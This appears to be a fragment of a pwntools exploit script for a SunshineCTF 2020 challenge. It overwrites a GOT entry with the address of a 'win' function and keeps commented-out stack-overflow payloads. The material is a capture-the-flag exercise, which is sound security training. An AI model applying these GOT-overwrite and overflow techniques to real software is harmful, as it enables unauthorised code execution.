...
p = new_proc(True) if not args.REMOTE else remote('chal.2020.sunshinectf.org', int('30005'))
pause()

overwrite_addr = int(((binary.sym['target'] - binary.sym['got.puts'])) / 8)
p.send(str(1472).encode() + b'\n')
p.send(str(binary.sym['win']).encode() + b'\n')

# p.sendline(b'A'*56 + p64(0xfacade)*15)
# p.sendafter(b'Race, life\'s greatest.\n', b'A'*0x13)
...
# payload = b''.ljust(0x37, b'A') + p64(binary.sym['win'])*5 + b'\n'
# p.send(payload)
